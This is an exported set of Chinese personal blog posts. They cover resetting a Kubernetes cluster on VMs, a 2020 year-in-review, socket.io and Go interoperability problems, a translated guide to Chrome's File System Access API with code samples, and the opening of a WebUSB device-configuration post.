12345$ kubectl get nodesNAME STATUS ROLES AGE VERSIONk8s-master Ready control-plane,master 40m v1.20.4k8s-node1 Ready &lt;none&gt; 28m v1.20.4k8s-node2 Ready &lt;none&gt; 28m v1.20.4 补充后来又发现每次恢复虚拟机的时候 coredns 的 pod 一直没法 Ready，查看日志发现是 dial 一直超时，目前还不知道原因是什么，解决办法是重启 coredns 的 Deployment： 1kubectl rollout restart deployment coredns -n kube-system 不过这之后 kube-proxy 就没办法把所有来自集群外部的访问自动定向到相应的 Node 上了，这个也还不知道为什么。不过可以通过 Node 的 IP 地址访问部署到它上面的服务。我的网络使用的是 flannel，目前还没有仔细研究到底是哪里出了问题。 最后Kubernetes的理念就是构建一个长期运行的系统，所以我这种 reset 的方法其实也是不太可取的办法，然后就是一定不要改变集群中节点的 IP 地址，要不然会非常麻烦。我这也算是体验了一把运维人员的工作？ 还有就是，VMware Workstation Pro 16 推出了一个叫 vctl的工具，他会建立一个容器给我们创建一个 Powershell 环境，让我们可以在里面运行 Kind 来模拟 k8s 集群，今天试了试，拉镜像有点慢，所以就先没有搞了，以后可以好好研究一下。下面附上几个用于参考的地址： https://docs.vmware.com/en/VMware-Workstation-Pro/16.0/com.vmware.ws.using.doc/GUID-1CA929BB-93A9-4F1C-A3A8-7A3A171FAC35.html （English） https://kind.sigs.k8s.io/docs/user/quick-start/ （English） https://qiita.com/YasuhiroABE/items/993a623c05d4dfe4d79c （日本語）","tags":["Kubernetes","Virtual Machine"],"categories":["问题解决"]},{"title":"2020","path":"/2020-conclusion/","content":"最近发现无聊的时候写博客是一种很好的消遣方式，恰逢本科快毕业了，那就写一篇博客来回味我无趣但又充实的一年吧。 学业大三下学期是在家中度过的，上网课可以说是非常的水，选了4门专业课我都觉得选少了，害得我大四还要选3门。回想过去三年的大学课程，那可真是比高中轻松多了，甚至让我有了高中这么学说不定也能学得很好的错觉。我也不是什么志在科研的人，所以在这方面也没有太大的压力，能在课程中拿到不错的分数我就挺满意了。 最终也顺利保上研了，保研到了传说中的“大交换”，找了一个看起来不错的导师，也算是终结了自己曾经那所谓的名校情结。由于我自己太怠惰，夏令营一个也没有参加，虽然有那么一点的遗憾，但是总体上由于我自己越来越佛系的态度，现在觉得在本校继续延续三年轻松愉悦的学生生活也挺好，就是还要继续作业考试论文不太愉悦。 这么说来最大的遗憾可能是还是没有直接工作了2333333（主要是不想伤害父子感情，我们两个人估计在对方眼里都是冥顽不化吧，不过这方面的话题就说来话长了，之后心中又不快的时候估计会写写）。 专业大三下期末的时候投了AT和字节，阿里等到我尘埃落定了才来找我，腾讯面了一面，结果因为我不去深圳给我挂了，所以最后靠耿总的内推进了字节。 七月份开始了实习，但实习内容和网上看的，听别人说的以及自己想象的都不一样。我投的是后台开发的岗位，结果很多时间都在为平台搭建前端。我后来也慢慢了解到，我们这个部门是新组建的，主要业务也是做设备，整个后端开发工作流以及团队建设都感觉不是很成熟。不过也省去了很多繁琐的开发流程。我进来之后基本也是自己独自摸索。 2020说实话，我感觉我在我的专业领域中学到了很多，涨了很多见识，这我得好好感谢我的室友们，尤其是耿总，他以一己之力提升了我们宿舍的技术氛围。他真是一个独立自主，思想自由的人（虽然我并不赞成他的所有观点），他在2020对我的影响真的很大，相必对我们宿舍的其他人影响也很大。 2020年我的专业能力可以说是“飞升”也不为过。从一个曾经因为不会一门编程语言被老师重拳出击（指计网课设）的CS萌新小白，变成了一个初窥门径的实习从业者，可以说是质的飞跃。虽说我大学报考专业一心咬死了计算机，但是感觉是在近两年我才开始逐渐感受到这个专业，这些学科，这些技术的魅力和乐趣。 如果要具体点说（指流水账），那在编程语言方面，我熟悉了Golang，Javascript，Typescript这三门语言，还稍微接触了一下Java。对于前端，我了解了HTML和CSS，学习了React和Electron框架，与浏览器也打了很多的交道。对于后端，我了解了不少Node的东西，在耿总的影响下学习到了许多数据系统方面的知识，年末学习了Websocket和一些消息中间件的用法。我也开始初探一些分布式相关的知识，看了传说中的MIT神课6.824，不过还没看完，之后接着继续，做了它前三个lab，了解了MapReduce计算模型，以及大名鼎鼎的Raft一致性算法等。期间还拜读了《DDIA》，读了一半，接下来也会继续读。年末的时候真切的感受到了开源社区的强大，找到了许多能直接使用的代码库，节约了许多开发成本，也让我从这些大佬的代码中学到很多东西。还有许多其他我的东西，比如一些框架的设计思想，一些系统的架构，一些工具的用法和原理等，就不一一列举了。 对于计算机这门学科，真的是想学的很多，想问的很多，希望自己能继续保持这份热情。 生活娱乐现实生活上半年由于疫情在家，吃完饭基本就没有活动，体重暴涨快20斤，下半年通过减少饭量，以及游了几次泳（大概有点帮助）又减了10斤下来，总之还需要继续减。不过由于长期不吃晚饭和时常不吃早饭，现在胃貌似出了点问题。 前不久和室友们一起去爬了一趟香山，可以说是把我折磨的够呛，可能是支气管炎的遗留问题，也可能是因为我长期不锻炼，爬山过程中我缺氧极其严重，脑袋胀痛发晕。然后年终和3位舍友去了个没有下一次的垃圾KTV唱歌。2020其余大部分时间都在家中和宿舍中度过，对于我来说算是再正常不过的了。当然还出了好几次勤，这个留到后面再说。 影视剧疫情在家第一次看了美剧，是一部职场喜剧，叫做《Brooklyn Nine Nine》，中文译作《神烦警探》，这部剧非常好看，情节设计的很巧妙，笑点也很足，每一季还有喜闻乐见的传统保留剧情。算上2020年的更新我一口气追了八季，听说今年有第九季，十分期待。然后在家无聊透顶的我重温了《神探狄仁杰》的前两季，以及《大宋提刑官》第一季，本来还想看《武林外传》的，但是我用的视频软件没有版权，遂作罢。 电影看了《信条》，《姜子牙》以及《未来的未来》，都没有对我产生太大的触动，不过我本来就不常看电影。 动画和漫画其实在进入大学之后，我就没有怎么追漫画了，一般都是屯好几话然后一口气看，还有一个原因是，之前追的漫画太多了，然后很多都消失在了大版权时代的洪流中，我也懒得去找了，也没有那么多闲钱去买正版。一直在追的也就《辉夜大小姐》和《一拳超人》，之前还有《七原罪》，不过已经完结了，其余的都是想起来才看一下。 动画倒是每个季度仍然看了很多，以及补了很多老番。如果要选出几部让我印象深刻的作品，那一定是《进击的巨人》，《别对映像研出手》以及《白箱》。《白箱》带给我的感动就像当初看《爆漫王》时的一样，中二期的我竟然错过了这一部佳作，实属不该。《巨人》还在更新中，剧情让人欲罢不能，而且我们宿舍还有一重度巨人厨 《别对映像研出手》和《白箱》对于我们动画爱好者来说都是狂欢。其实去年本来还有天下第一的《摇曳露营》第二季的，但是跳票到今年一月了（不也挺好吗）。 恋爱无。希望接下来会有。 电子游戏说到这个话题我可就更来劲了。虽然去年玩的不多，但是玩的时间还是挺长的。 音游2020可谓是SDVX音游力飞升的一年。2020年1月我还只是一个被17暴打的小魔骑，现在已经是后光刚力罗了。出勤也出了好几次，每一次出勤都感受到了地力的提升。移动端倒是没怎么玩了，Arcaea打不出出彩的成绩，遂不玩了。下半年开始玩了プロジェクトセカイ，虽然打击感很塑料，但是作为术术人，能玩到那么多曲子是真不戳。 PC去年又重新回坑了风暴，但是现在又回到半弃坑状态了。然后就是期待了一年的赛博朋克2077。。。怎么说呢，可以说是期待过头了，我本来期待的是GTA，结果来的还是巫师，嗯。。就这种感觉。。只能说我对CRPG着实没啥感觉。现在玩了20小时玩完了两个主要NPC的主线，接下来有兴趣了再继续推主线吧。 PS4今年玩的最多的游戏非歌姬计划FTDX莫属了，这游戏是真好玩，老婆们跳舞是真好看，术曲是真好听，我玩的是真的垃圾。现在也就只能玩玩8星曲的样子，还得继续多练。 除了歌姬计划，还借了隔壁隔壁宿舍小双同学的战神4碟子来玩，一连玩了几天通关了，真不愧是上个世代末的神作，剧情，玩法，任务设计都是一流，我已经迫不及待想玩战神5了。 然后就用赛博朋克的退款买了蜘蛛侠莫拉尔斯，对于我这种第一次接触蜘蛛侠游戏的人来说是非常新鲜了，不过到后面也就是刷刷刷，剧情也是非常王道的超级英雄剧情，可以算得上一款佳作。 接下来又体验了十三机兵，这游戏颠覆了我对文字冒险游戏的认识，总之是非常的想玩，等打折必入。 展望2021，希望家人和自己健康，希望研究生能和现在室友继续做室友，希望专业能力能更上一层楼，希望音游力继续飞升，希望能成为「或帝滅斗」，希望能有GTA6的消息，希望能看到更好看的动画片，希望能谈个恋爱。（当我正要更新这篇文章的时候，我发现我又一位室友脱单了，酸死我了）","tags":["年终总结","流水账"],"categories":["生活"]},{"title":"Socket.io 踩坑记录","path":"/socket-io-issues/","content":"最近由于项目需要接触了 socket.io 这一套工具，它本身是一个 Node.js 的包，使用 long polling 或者 websocket 的方式（在我的项目中我是用的是 websocket）提供持续的网络连接服务。由于简单好用（虽然我在知乎上看到有人说这玩意儿就是给小白玩的，2333），很多开发者为其开发了不同语言的 SDK，比如 Java、C++、Go 等，然后我项目的前端用的 Node.js，后端用 Golang。由于 socket.io 本身的设计以及 Go 版本开源库的残缺，踩了很多坑，我决定在这篇博客中好好总结一下。 跨域请求的问题由于 go-socket.io 是基于 http 服务器的，在建立 websocket 连接的时候会先发送一个 get 请求，由于请求是跨域的，所以理所应当会被服务器给拦下来，然后返回一个 403，所以首先得处理跨域的问题。 处理这个问题有很多种方式。 第一种方式是直接拿到请求后把 Header 里的 Origin 字段干掉，然后再交给接下来的 http 处理逻辑处理。第二种方式是添加一个中间件来设置 Header 中的允许跨域字段，这两种方式在这个 issue 中都有实现方法： https://github.com/googollee/go-socket.io/issues/242 第三种方式是社区开发者们新提供的方式，就是在启动 socket.io server 的 option 中指定允许的域名，这算是最合适的一种方法了吧。 12345678910111213141516allowOrigin := func(r *http.Request) bool &#123; return true&#125;server, err := socketio.NewServer(&amp;engineio.Options&#123; Transports: []transport.Transport&#123; &amp;polling.Transport&#123; Client: &amp;http.Client&#123; Timeout: time.Minute, &#125;, CheckOrigin: allowOrigin, &#125;, &amp;websocket.Transport&#123; CheckOrigin: allowOrigin, &#125;, &#125;,&#125;) 更多信息可以查看这个 issue：https://github.com/googollee/go-socket.io/issues/372 go-socket.io 与 socket.io 的兼容性问题在前端，我一开始使用的是 3.0 版本的 socket.io。结果发现建立连接的握手请求前后端对应不上，后端触发两次 connect 事件，之后也无法进行正常的双工通信，后来发现原来 go 这个库还不支持 2.0 版本及以上的 socket.io。这其中应该是通信协议上不一样。 这个项目其实很早就已经搁置了，owner 在几年前就撒手不管了，这几年一直是靠开源社区的开发者们来维护，所以这个项目的进度迟迟得不到更新。目前这个库只支持 &#115;&#x6f;&#x63;&#x6b;&#101;&#116;&#46;&#105;&#111;&#64;&#50;&#x2e;&#48; 之前的版本，不支持 2.0。 如果实在要与 socket.io 2.0 进行对接，可以选用其他的语言进行开发，或者使用其他的几个 go 开源库，虽然这几个 star 不多，我也没用过。 https://github.com/pschlump/socketio https://github.com/ambelovsky/gosf-socketio 详情可见这个 issue：https://github.com/googollee/go-socket.io/issues/188 之后我也打算看看这个项目，看看能不能贡献点什么。 分布式场景下的问题当我把我的后端服务部署到了集群上，我发现有些时候客户端收不到本应收到的消息。经过一系列的分析查找，我发现原来是因为不只有一个实例部署了我的服务，然后所有访问服务的请求都会被 nginx 网关按照一定策略进行负载均衡，然后再分配到某个实例上。又因为我将所有的 socket 连接上下文都存到了内存中，每次都从内存中提取会议中的连接者，再将消息发给他们，由于负载均衡的存在，同一个会议的连接可能被导向不同的实例，这种情况下一个连接生产的信息就无法转发给另一个连接。 为解决这个问题可以从两方面入手。第一种是从负载均衡入手，nginx 的负载均衡策略有很多种，比如对 ip 进行 hash，或者对请求头中的某些信息进行 hash，然后将请求导向不同实例，我们可以更改策略将同一个会议的连接全部导向一个实例；第二种是使用消息中间件，将一个连接产生的消息推入消息队列中，然后另一个连接从中读取。 经过多方面的考量，我最终选用了更改 nginx 负载均衡策略的方式，因为公司的各个消息中间件组件都有很大的局限性，下面我也会说说各种方案我是怎么想的。 负载均衡方案socket.io 建立连接时会发送一个 GET 请求，然后开始进行握手，而我们可以自定义这个请求。但由于 socket.io 为了遵循 websocket 协议，当使用 websocket 协议传输时，我们没办法更改请求的 Header。但是我们仍然可以为请求添加 query 参数，比如我们可以让同一个会议的连接者请求时都在 query 中带上一个相同的标识，然后再将 nginx 的负载均衡策略改为只按照请求 uri 进行 hash，这样便可以将请求 uri 相同的所有连接都导向同一个实例。 不过这种方案可能会出现热点问题，那就等之后真的出现了再说吧。（不过我应该是等不到那个时候了） 消息中间件方案Redis 消息队列其实 Redis 自己也实现了有消息队列功能的接口。消费者可以 Subscribe 一个 Channel，当生产者向 Channel 中推消息的时候，消费者便可以从此 Channel 中拿出消息。不过不幸的是，我们公司的 Redis 并没有支持这一功能，而且公司貌似禁用任何阻塞操作，遂作罢。另外，消费者是不是共同消费 Channel 中的消息，还是一个消费者一个副本，这个我也没有深入研究。 利用 Redis 缓存自行实现这是一个临时得不能再临时的方案，肯定是无法投入大规模使用的。这个方案简单来说，就是在 Redis 中保存有到某个会议连接的实例，生产者会为每一个实例生产一份消息，然后每一个实例取出自己的一份，在发给连接到自己的连接者。这个方案在逻辑上是很完美的，但是会极其消耗资源。首先，我的一个消息大概会有 8KB，这对于 Redis 来说本身就很离谱了；其次，要从 Redis 中拿出实时的消息，需要随时轮询 Redis，因为公司的 Redis 不提供阻塞操作，而不停的轮询是极其浪费资源的。处于这样的考虑，我还是暂时没选择这样的方案。 RocketMQ 等消息队列按理来说使用传统的消息队列是最靠谱的方案，生产者将消息推入消息队列，然后每一个订阅了的消费者都可以从中拿到消息。但是公司的消息队列组件看起来并不适合我们这业务场景。公司的 Kafka 主要是为离线业务服务，它会将消息转存到 HDFS，并不太适合我这样的实时在线业务。于是我选择了公司推荐的支持在线业务的 RocketMQ看一看。 其实 RocketMQ 是支持广播消费的（就是生产者产生的每一个消息每一个订阅了的消费者都能消费到，与之对应的是集群消费，就是一个消费者消费了其他消费者就消费不到了），但是公司的 RocketMQ 组建尚未支持。那我就又只能爬了。其实消费组这一概念也可以实现这样的机制，但是公司的消息队列服务都是公用的，每一个 Topic 的 Consume Group 都需要单独申请，我不可能为每一个实例都手动申请一个，因为实例是弹性变化的。遂作罢。 不过还是有一个方案的，就是自建一个消息队列服务，只给自己用，这样上面的问题就都迎刃而解了。不过这得以后有时间再来慢慢研究。。。 写在最后的吐槽与总结之类的话go-socket.io 这个库其实还有一些其他问题，比如并没有保证连接的线程安全，之后我也想仔细看看它的源码以及 socket.io 的源码与原理，希望能帮这个开源项目做一点优化和增强工作，也好填补一下之后漫长寒假的空虚（到时候可能就每天躺尸了） 对于我接手的这个项目，虽然开发规模不大，主要逻辑也非常简单，比起我们的主要业务来说那就是小玩具，工程量和大作业差不多，但是也让我感受到了开发一个企业级应用需要考虑的各种事情，并且积累的挺多开发经验（虽然大部分是 Node.JS 和 TS 的经验）。 最后不得不说，开源真是个好东西，节约了大量开发成本，再次感谢各位开源大佬。","tags":["Node.js","Golang"],"categories":["问题解决"]},{"title":"File System Access API：简化访问本地文件","path":"/chrome-file-system-access/","content":"原文章：https://web.dev/file-system-access/ 原作者：Thomas Steiner（@tomayac）已同意转载。 什么是 File System Access APIFile System Access API（The File System Access API，之前又叫 Native File System API，更之前叫 Writeable Files API）使得开发者们能够构建能与用户本地设备文件交互的强大 Web 应用，比如 IDE、图像视频编辑器、文本编辑器等。一旦用户允许了 Web 应用访问本地文件的请求，此 API 便可以使 Web 应用直接对用户设备上的文件和文件夹进行读写修改。除了读写文件， File System Access API 还提供了打开目录以及列举目录内容的能力。 如果你曾经操作过文件读写，那你会很熟悉我下面分享的内容。不过我还是鼓励你读一下这篇文章，因为不是所有的系统都是类似的。 （原作者注：对于 File System Access API 的设计与实现我们进行了深思熟虑，以确保人们能够轻松的管理他们的文件。查看 安全与权限 部分来获取更多信息。) 文章进度（原文中已经全部完成）前往 https://web.dev/file-system-access/#status 查看 使用 File System Access API为了展示 File System Access API 的强大与好用，我写了一个单文件文本编辑器。它可以让你打开一个文本文件，编辑它，将修改保存回本地，或者新建一个文件然后保存修改到本地。这并不是什么精致（fancy）的东西，但它足以帮你理解概念。 试试看看看 File System Access API 在文本编辑器 demo 中的表现。 从本地文件系统读取一个文件我想要做的第一件事是让用户选择一个文件，然后打开并从磁盘上读取这个文件。 让用户选择一个文件进行读取File System Access API 中的入口点（entry point）是 window.showOpenFilePicker()。当调用它时，浏览器会弹出一个文件选择对话框，并让用户选择一个文件。用户选择完文件后，此 API 会返回一个文件句柄（handle）数组。option 参数可以让你影响文件选择器的行为，比如允许用户选择多个文件，目录或者其他文件类型。如果你没有指定 option 参数，选择器只让用户选择一个文件。这对于一个文本编辑器来说恰到好处。 和众多强大的 API 一样，必须在一个安全上下文（secure context）中完成对 showOpenFilePicker() 的调用并且只能在一个 user gesture（详见 Chromium 对此的定义） 中被调用。 123456let fileHandle;butOpenFile.addEventListener(&#x27;click&#x27;, async () =&gt; &#123; // Destructure the one-element array. [fileHandle] = await window.showOpenFilePicker(); // Do something with the file handle.&#125;); 一旦用户选择了一个文件，showOpenFilePicker() 会返回一个句柄数组，在这种情况下会返回一个只有一个 FileSystemFileHandle 对象的数组，这个对象包含了需要和文件进行交互的属性和方法。 我们需要维护一个对此句柄的引用以便后续使用，我们需要用它来进行保存文件或者其他文件操作。 从文件系统中读取一个文件现在你有了一个文件的句柄，这下你就能够拿到这个文件的属性或者访问这个文件本身。现在，我会简单地读读取它的内容。调用 handle.getFile 并返回一个 File 对象，它包含一个二进制文件（blob）。为了拿到二进制文件中的数据，调用它的方法（slice() , stream(), text(), arrayBuffer()）。 12const file = await fileHandle.getFile();const contents = await file.text(); FileSystemFileHandle.getFile() 返回的 File 对象只有对应的底层文件没有后被更改时可读。如果底层文件已经被修改饿了，那此 File 对象便会变为不可读，这时候你得重新调用 getFile() 来获取新的 File 对象来读取被更改的数据。 将上面的操作组合到一起当用户点击打开（Open）按钮，浏览器会弹出文件选择器。当选中一个文件，这个应用会把读到的内容放入一个 &lt;textarea&gt; 中。 1234567let fileHandle;butOpenFile.addEventListener(&#x27;click&#x27;, async () =&gt; &#123; [fileHandle] = await window.showOpenFilePicker(); const file = await fileHandle.getFile(); const contents = await file.text(); textArea.value = contents;&#125;); 将文件写入本地文件系统在这个文本编辑器中，有两种方式来保存文件：保存（Save）和另存为（Save As）。保存使用之前的文件句柄简单地将修改写回原文件中。但是另存为创建了一个新的文件，并需要一个新的文件句柄。 创建一个新文件为了保存一个文件，我们需要调用 showSaveFilePicker() 来让文件选择器变为“保存”模式，此模式下，文件选择器让用户选择一个文件来进行保存。在这个文件编辑器中，我想让它自动加上 .txt 的扩展名，所以我提供了一些额外的参数。 1234567891011121314async function getNewFileHandle() &#123; const options = &#123; types: [ &#123; description: &#x27;Text Files&#x27;, accept: &#123; &#x27;text/plain&#x27;: [&#x27;.txt&#x27;], &#125;, &#125;, ], &#125;; const handle = await window.showSaveFilePicker(options); return handle;&#125; 保存修改到本地磁盘你可以 Github 上找到我这个文本编辑器 demo 的所有代码。核心的文件系统交互部分在 fs-helpers.js 中。简单来说，整个过程如以下代码所示。我会一步一步地进行解释。 12345678async function writeFile(fileHandle, contents) &#123; // Create a FileSystemWritableFileStream to write to. const writable = await fileHandle.createWritable(); // Write the contents of the file to the stream. await writable.write(contents); // Close the file and write the contents to disk. await writable.close();&#125; 向磁盘中写入数据需要利用 FileSystemWritableFileStream 对象，其本质是一个 WritableStream。调用 createWritable() 为文件句柄对象创建文件流（stream）。调用 createWritable() 后，浏览器会先向用户请求文件的写权限。如果你拒绝了此请求，createWritable() 会抛出异常 DOMException，你的应用也没办法写这个文件。在这个文件编辑器中，saveFile() 方法会处理这些 DOMException 异常。 你可以从文件编辑器中获取你要写的字符串（string）作为 write() 方法的参数传入。也可以直接获取 BufferSource 或者 Blob。例如，你可以直接向文件传输数据流（pipe a stream）： 123456789async function writeURLToFile(fileHandle, url) &#123; // Create a FileSystemWritableFileStream to write to. const writable = await fileHandle.createWritable(); // Make an HTTP request for the contents. const response = await fetch(url); // Stream the response into the file. await response.body.pipeTo(writable); // pipeTo() closes the destination pipe by default, no need to close it.&#125; 你可以在文件流中使用 seek() 或者 truncate() 方法来精确定位文件中的位置，或者改变文件的大小。 （原作者提醒：直到文件流关闭前修改都不会写入磁盘，可以通过调用 close() 或者等文件流自动关闭） 将文件句柄存入数据库文件句柄是可以序列化的，这意味着你可以将它们存入数据库中，或者调用 postMessage() 在相同的域（the same top-level origin）中传递它们。 将文件句柄存入数据库意味着你可以存储状态，或者记录下用户在使用哪些文件。这让你可以拥有一个最近打开或编辑过的文件列表，或者可以提供打开最近使用的文件的功能等等。在这个文本编辑器中，我将用户最近打开的五个文件存了起来，让用户能够方便地重新选择这些文件。 在不同会话（session）中文件地访问权限是不能持续存在的，所以你应该使用 queryPermission() 来检验用户是否允许对某文件的访问。如果没有，使用 requestPermission() 来重新请求。 在上面这个文本编辑器中，我定义了一个 verifyPermission() 方法来检查用户是否已经授予了权限， 如果没有，就会请求。 12345678910111213141516async function verifyPermission(fileHandle, readWrite) &#123; const options = &#123;&#125;; if (readWrite) &#123; options.mode = &#x27;readwrite&#x27;; &#125; // Check if permission was already granted. If so, return true. if ((await fileHandle.queryPermission(options)) === &#x27;granted&#x27;) &#123; return true; &#125; // Request permission. If the user grants permission, return true. if ((await fileHandle.requestPermission(options)) === &#x27;granted&#x27;) &#123; return true; &#125; // The user didn&#x27;t grant permission, so return false. return false;&#125; 通过在读请求时申请写权限，我减少了请求权限的次数：打开一个文件时用户只用允许一次，便可以同时授予应用读写权限。 打开一个目录并列出其内容要列出目录下的所有文件，需要调用 showDirectoryPicker() 。用户在我呢见选择器中选择一个目录，然后会返回一个 FileSystemDirectoryHandle，这个句柄对象能让你列举并访问目录中的文件。 1234567const butDir = document.getElementById(&#x27;butDirectory&#x27;);butDir.addEventListener(&#x27;click&#x27;, async () =&gt; &#123; const dirHandle = await window.showDirectoryPicker(); for await (const entry of dirHandle.values()) &#123; console.log(entry.kind, entry.name); &#125;&#125;); 新建或者目录下的访问文件和文件夹通过目录的句柄，你可以通过使用 getFileHandle() 与 getDirectoryHandle() 创建或者访问文件和文件夹。你可以通过传入一个额外的 option 对象，并带有一个布尔类型的 create 字段，来决定如果文件或文件夹不存在时是否创建一个新的。 123456// In an existing directory, create a new directory named &quot;My Documents&quot;.const newDirectoryHandle = await existingDirectoryHandle.getDirectoryHandle(&#x27;My Documents&#x27;, &#123; create: true,&#125;);// In this new directory, create a file named &quot;My Notes.txt&quot;.const newFileHandle = await newDirectoryHandle.getFileHandle(&#x27;My Notes.txt&#x27;, &#123; create: true &#125;); 解析目录中文件的路径当你正在处理目录下的文件或文件夹时，解析它们的路径会对你很有用。这个操作可以通过调用 resolve() 实现。被解析的文件可以是目录的直接子女或者间接子女。 123// Resolve the path of the previously created file called &quot;My Notes.txt&quot;.const path = await newDirectoryHandle.resolve(newFileHandle);// `path` is now [&quot;My Documents&quot;, &quot;My Notes.txt&quot;] 删除目录下的文件和文件夹如果你获取了访问一个目录的权限，那你就能够使用 removeEntry() 来删除它下面的文件与文件夹。删除文件夹时，你可以选择递归删除其所有子文件及其包含的文件。 1234// Delete a file.await directoryHandle.removeEntry(&#x27;Abandoned Masterplan.txt&#x27;);// Recursively delete a folder.await directoryHandle.removeEntry(&#x27;Old Stuff&#x27;, &#123; recursive: true &#125;); 集成拖放（Drag and drop）功能HTML Drag and Drop interfaces 让 Web 应用可以接受直接将文件拖放到网页中。在拖放操作中，拖拽文件或目录项将分别关联到文件或目录项的入口（entry）。当拖拽文件时，DataTransferItem.getAsFileSystemHandle() 方法会返回一个包含 FileSystemFileHandle 对象的 promise 对象，当拖拽目录时，一个包含 FileSystemDirectoryHandle 对象的 promise 对象。下面的代码展示了这一过程。注意，无论是文件还是目录， Drag and Drop interface 中的 DataTransferItem.kind 都是 &quot;file&quot; ，然而 File System Access API 中的 FileSystemHandle.kind 会区分为 &quot;file&quot; 和 &quot;direcotry&quot;。 12345678910111213141516171819202122elem.addEventListener(&#x27;dragover&#x27;, (e) =&gt; &#123; // Prevent navigation. e.preventDefault();&#125;);elem.addEventListener(&#x27;drop&#x27;, async (e) =&gt; &#123; // Prevent navigation. e.preventDefault(); // Process all of the items. for (const item of e.dataTransfer.items) &#123; // Careful: `kind` will be &#x27;file&#x27; for both file // _and_ directory entries. if (item.kind === &#x27;file&#x27;) &#123; const entry = await item.getAsFileSystemHandle(); if (entry.kind === &#x27;directory&#x27;) &#123; handleDirectoryEntry(entry); &#125; else &#123; handleFileEntry(entry); &#125; &#125; &#125;&#125;); 访问域私有文件系统（the origin-private file system）如这个名字所说，域私有文件系统是网页的域私有的存储端点（注：也就是说这个文件系统是这个网页独有的，你刷新页面就变成一个新的了）。浏览器通常将网页的域私有文件系统中的内容存在磁盘的某个位置，但是不会让你轻易找到。显然，你在你电脑真实的文件系统上也是找不到相应名字的域私有文件系统的内容的。浏览器只是让它看起来像个文件系统罢了，事实上这些文件可能存储在数据库或者其他数据结构中。重要的事再说一遍：当你使用这个 API（指域私有文件系统的）的时候，不要指望能在你的硬盘上找到1：1的对应。拿到域私有文件系统根目录（root）的 FileSystemDirectoryHandle 之后，你可以像操作普通文件系统一样操作它。 1234567const root = await navigator.storage.getDirectory();// Create a new file handle.const fileHandle = await root.getFileHandle(&#x27;Untitled.txt&#x27;, &#123; create: true &#125;);// Create a new directory handle.const dirHandle = await root.getDirectoryHandle(&#x27;New Folder&#x27;, &#123; create: true &#125;);// Recursively remove a directory.await root.removeEntry(&#x27;Old Stuff&#x27;, &#123; recursive: true &#125;); Polyfilling(注：Polyfill 为 Web 开发者中的黑话，大致意思是实现浏览器不支持的原生 API 代码。具体意义请自行 Google。) 我们也可以自己实现一些 File System Access API 中的方法。 showOpenFilePicker() 可以约等于 &lt;input type=&quot;file&quot;&gt; 元素。 showSaveFilePicker() 可以通过 &lt;a download=&quot;file_name&quot; 元素来模拟，但是尽管这个可以触发下载，但是它不允许覆盖已存在的文件。 showDirectoryPicker() 可以通过 &lt;input type=&quot;file&quot; webkitdirectory&gt; 元素来模拟。（不过这个未被标准化） 我们开发了一个叫 browser-nativefs 的库来尽可能地使用 File System Access API， 如果你无法使用，你可以使用上述的次优方案。 安全与权限Chrome 团队设计和实现 File System Access API 的核心原则定义在 Controlling Access to Powerful Web Platform Features 中，包括了用户控制、透明度和用户工效（ ergonomics）几方面。 打开文件或保存新文件当打开一个文件，用户通过文件选择器提供读文件或目录的权限。文件选择器只能在 secure context 中通过 user gesture 触发（注：就是需要用户自己点击才能弹出文件选择器）。如果用户不想打开了，他们可以直接取消，然后网站拿不到任何访问权限。这个和 &lt;input type=&quot;file&quot;&gt; 是一样的。 同样的，当一个 Web 应用想要保存一个新文件，浏览器也会弹出一个保存文件的选择器，让用户选择保存的文件名和路径。当用户保存一个新文件（或者覆盖一个老文件），文件选择器会授予应用对这个文件的写权限。 被限制的文件夹为了保护用户和他们的数据，浏览器可能会限制用户访问特定文件夹的能力，比如核心的操作系统文件夹。出现这种情况时，浏览器会弹窗提示用户另选一个文件夹。 更改一个已存在的文件或目录Web 应用只有得到用户明确的允许之后才能更改本地文件。 权限提示当用户想要保存修改到有读权限的本地文件时，浏览去会弹出提示为整个网站询求这个文件的写权限。这个权限请求只能被 user gesture 触发，比如按下保存按钮。 另外，一些编辑多文件的 Web 应用（比如 IDE），可能在打开文件的时候就请求保存修改的权限。 如果用户选择取消（Cancle），Web 应用就没办法保存修改到本地。应该提供其他让用户保存他们数据的方法，比如提供 “download” the file 这样的链接，或者保存数据到云端等等。 透明性用户授予 Web 应用保存文件的权限后，浏览器的 URL 栏上会显示一个图标。点击这个图标会弹出一个可访问文件列表。用户可以选择撤销对某些文件的权限。 权限有效期只要你不关闭这个域下的所有标签页，Web 应用就可以保持已有的权限。一旦你关闭了所有标签页，网站就会失去所有的访问权限。用户下次再打开这个 Web 应用，就需要重新按照提示赋予文件访问权限。 反馈如果你想对 API 的设计者说点什么，有问题，或者想反馈 BUG，请前往原网站进行下一步的操作。https://web.dev/file-system-access/#feedback 我自己想说的话这应该是目前为止（2020-12-26）我写的最长的一篇博客了吧，虽然全文的都是翻译的别人的文章。。。我是用这个 File System Access API 的起因是我在公司实习突然接盘了一个搁置了半年的项目，然后这个项目由于没有客户端人力，所以就然我暂时赶出一版 Web 应用来完成大致的功能（虽然我是后端开发）。由于有访问本地文件的需求，我通过 Google 找到了这个不久前才更新的 Chrome API（版本 83），还真是及时。。不过到本文完成的时候，我已经转向 Electron 开发了，也就是说，这个 API 其实我已经放弃使用了。作为浏览器提供的 API，它的功能真的有很大的局限性，不过如果要写一个在线的编辑器啥的是真的很方便。 作为浏览器上的网页应用，确实要在安全性和方便性之间做出取舍，像这个 API 就没办法直接获取本地文件系统的信息，不像 node 的 fs 模块，这也是我最后又选择重构为 Electron 的原因。。。 找了一份后台开发的实习，但我怎么感觉在前端和客户端开发的道路上越走越远了呢。。而且也没有人系统地带我，全靠自己摸索。。。我这实习真的有什么大的意义吗（除了恰烂钱）。。。","tags":["Javascript","学习","Web","Chrome","文章翻译"],"categories":["编程开发"]},{"title":"使用 Chrome 浏览器连接 USB 设备","path":"/web-usb-connector/","content":"使用 Chrome 浏览器连接 USB 设备的一些总结。 项目地址https://github.com/RinChanNOWWW/web_usb_connector 前言在公司 mentor 给我说来了一个需求，想要能够通过 Web 配置终端设备的一些设置，让我看看怎么用浏览器通过 USB 连接到设备。 好巧不巧的是，作为一个街机音游狗，接触了各种黑科技的我还真用过这种 Web 配置工具。我使用的一款手台就是通过这样的方式进行配置的，而且作者还将所有代码完全开源了：PocketVoltex/Software/WebConfig，于是我按照作者 mon 的做法将连接 USB 设备并进行配置的代码框架提取了出来。 我也找了 Github 上其他项目看了看，大多数都是连接 Arduino 的，而且都没有 mon 的这个简单好学。 编写 Javascript将浏览器提供的 usb API 封装起来将连接 usb 的方法封装起来赋值给 window 以便全局使用。 